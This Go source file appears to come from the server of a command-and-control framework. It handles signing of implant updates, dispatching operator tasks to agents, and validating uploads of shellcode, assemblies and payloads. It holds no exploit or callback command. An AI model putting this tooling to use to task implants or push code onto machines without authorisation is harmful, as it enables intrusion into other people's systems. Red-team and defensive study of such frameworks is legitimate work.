package server

import (
	"encoding/base64"
	"fmt"
	"io"
	"log/slog"
	"net/http"
	"path/filepath"
	"strings"

	"github.com/forgec2/forgec2/internal/payload"
	"github.com/gin-gonic/gin"
)

// ── Update signing + simple/one-param dispatch + upload validation ─────────

// handleUpdateSigningKey exposes the public half of the update-signing key so
// external tooling can verify or pre-sign updates. Admin-only: the public key
// reveals which builds accept updates.
// GET /api/update-signing/public-key
func (s *Server) handleUpdateSigningKey(c *gin.Context) {
	pubHex, err := payload.UpdateSigningPublicKeyHex()
	if err != nil {
		respondError(c, http.StatusInternalServerError, sanitizeError(err, "update signing"))
		return
	}
	respond(c, gin.H{"success": true, "public_key": pubHex})
}

// handleSignUpdate signs an externally computed SHA-256 digest. Admin-only:
// a valid signature authorises code execution on every pinned implant.
// POST /api/update-signing/sign   sha256=<64 hex>
func (s *Server) handleSignUpdate(c *gin.Context) {
	shaHex := strings.ToLower(strings.TrimSpace(c.PostForm("sha256")))
	if shaHex == "" {
		shaHex = strings.ToLower(strings.TrimSpace(c.Query("sha256")))
	}
	sig, err := payload.SignUpdateHash(shaHex)
	if err != nil {
		respondError(c, http.StatusBadRequest, sanitizeError(err, "update signing"))
		return
	}
	s.LogAuditRecord(c, "sign_update", "system", "",
		"signed update digest "+shaHex, true, nil)
	respond(c, gin.H{"success": true, "sha256": shaHex, "signature": sig})
}

// simpleTaskDef defines a basic task with no extra parameters
type simpleTaskDef struct {
	taskType string // e.g. "ps", "reboot"
	audit    string // e.g. "request_ps", "reboot"
	details  string // audit detail string
}

// createSimpleTask creates and dispatches a parameterless agent task
func (s *Server) createSimpleTask(c *gin.Context, id string, def simpleTaskDef) bool {
	if !s.requireOperator(c) {
		return false
	}
	task := s.issueAgentTask(c, id, TaskSpec{Type: def.taskType})
	if task == nil {
		return false
	}
	slog.Info(def.taskType+" requested", "agent_id", id)
	s.dispatchTask(c, task, def.audit, def.details)
	return true
}

// oneParamTaskDef defines a task that reads a single value from a form field
// (trying "command" then "target"), with an optional default and custom detail formatter.
type oneParamTaskDef struct {
	taskType      string
	audit         string
	paramField1   string                  // primary form field name (empty = "command")
	paramField2   string                  // fallback form field name (empty = "target")
	defaultValue  string                  // used when both fields are empty
	required      bool                    // if true, return 400 when empty
	auditDetailFn func(val string) string // optional custom detail formatter (nil = use raw value)
}

// createOneParamTask reads a single parameter from form fields and dispatches the task.
func (s *Server) createOneParamTask(c *gin.Context, def oneParamTaskDef) bool {
	if !s.requireOperator(c) {
		return false
	}
	id := c.Param("id")
	field1 := def.paramField1
	if field1 == "" {
		field1 = "command"
	}
	field2 := def.paramField2
	if field2 == "" {
		field2 = "target"
	}

	val := c.PostForm(field1)
	if val == "" {
		val = c.PostForm(field2)
	}
	if val == "" {
		val = def.defaultValue
	}
	if def.required && val == "" {
		respondError(c, http.StatusBadRequest, def.taskType+" requires a parameter")
		return false
	}

	task := s.issueAgentTask(c, id, TaskSpec{Type: def.taskType, Command: val})
	if task == nil {
		return false
	}

	detail := val
	if def.auditDetailFn != nil {
		detail = def.auditDetailFn(val)
	}
	slog.Info(def.taskType+" requested", "agent_id", id, "param", val)
	s.dispatchTask(c, task, def.audit, detail)
	return true
}

// validateCommandArg rejects values that could break the agent's `|`-delimited
// command parsing or abuse field sizes. Applies to free-form command args such
// as injection techniques and spawn targets.
func validateCommandArg(v string, maxLen int, field string) error {
	if len(v) > maxLen {
		return fmt.Errorf("%s too long (max %d characters)", field, maxLen)
	}
	if strings.ContainsAny(v, "|\x00\r\n\t") {
		return fmt.Errorf("%s contains invalid characters", field)
	}
	return nil
}

// allowedUploadExtensions maps field names to their allowed file extensions.
// This prevents arbitrary file uploads that could be used as attack vectors.
var allowedUploadExtensions = map[string][]string{
	"shellcode": {".bin", ".raw", ".dat", ".sc", ".exe", ".dll", ".c", ".txt"},
	"assembly":  {".exe", ".dll", ".csproj", ".zip", ".txt"},
	"bof":       {".o", ".bin", ".dat", ".txt"},
	"file":      {".txt", ".csv", ".json", ".xml", ".log", ".ps1", ".bat", ".cmd", ".vbs", ".js", ".py", ".rb", ".sh", ".c", ".h", ".bin"},
	"payload":   {".exe", ".dll", ".ps1", ".sh", ".bin", ".dat"},
	"config":    {".yaml", ".yml", ".json", ".xml", ".ini", ".conf", ".toml"},
}

// validateUploadExtension checks whether the file extension is allowed for the given field.
func validateUploadExtension(fieldName, filename string) error {
	allowed, ok := allowedUploadExtensions[fieldName]
	if !ok {
		// Unknown field: allow common text/binary extensions only
		allowed = []string{".txt", ".bin", ".dat", ".csv", ".json", ".xml", ".log", ".ps1", ".bat", ".sh", ".c", ".h"}
	}
	lower := strings.ToLower(filename)
	actualExt := filepath.Ext(lower)
	for _, ext := range allowed {
		if actualExt == ext {
			return nil
		}
	}
	return fmt.Errorf("file extension not allowed for %s: %s (allowed: %s)", fieldName, actualExt, strings.Join(allowed, ", "))
}

// validateUploadMagicBytes reads the first 16 bytes and rejects obviously dangerous content.
// This is a defense-in-depth check; extension validation is the primary gate.
func validateUploadMagicBytes(fieldName, filename string, data []byte) error {
	if len(data) < 4 {
		return nil // too short to matter
	}
	// Reject PE executables uploaded as shellcode/bof (should be raw bytes)
	dangerous := map[string][]string{
		"shellcode": {"MZ", "PK"}, // .exe, .zip disguised as shellcode
		"bof":       {"MZ", "PK"},
		"assembly":  {"PK"},
	}
	badPrefixes, ok := dangerous[fieldName]
	if !ok {
		return nil
	}
	for _, prefix := range badPrefixes {
		if string(data[:min(len(data), len(prefix))]) == prefix {
			ext := filepath.Ext(filename)
			if ext == ".exe" || ext == ".dll" || ext == ".zip" {
				continue // allowed by extension, don't reject
			}
			return fmt.Errorf("suspicious file content for %s (magic bytes match %s)", fieldName, prefix)
		}
	}
	return nil
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

// handleFileUpload reads an uploaded file from a form field and returns base64 content.
// fieldName is the form field name (e.g. "shellcode", "assembly", "bof").
func (s *Server) handleFileUpload(c *gin.Context, fieldName string) (filename, b64Data string, size int64, ok bool) {
	file, err := c.FormFile(fieldName)
	if err != nil {
		respondError(c, http.StatusBadRequest, fieldName+" file required")
		return
	}
	if file.Size > MaxUploadSize {
		respondError(c, http.StatusBadRequest, fmt.Sprintf("file too large: %d bytes (max %d)", file.Size, MaxUploadSize))
		return
	}

	// Validate file extension before reading content
	if err := validateUploadExtension(fieldName, file.Filename); err != nil {
		respondError(c, http.StatusBadRequest, "invalid file extension for "+fieldName)
		return
	}

	f, err := file.Open()
	if err != nil {
		respondError(c, http.StatusInternalServerError, "failed to read "+fieldName)
		return
	}
	defer f.Close()
	data, err := io.ReadAll(f)
	if err != nil {
		respondError(c, http.StatusInternalServerError, "failed to read "+fieldName+" data")
		return
	}

	// Validate magic bytes for defense-in-depth
	if err := validateUploadMagicBytes(fieldName, file.Filename, data); err != nil {
		respondError(c, http.StatusBadRequest, "file content does not match expected type")
		return
	}

	filename = file.Filename
	size = int64(len(data))
	b64Data = base64.StdEncoding.EncodeToString(data)
	ok = true
	return
}
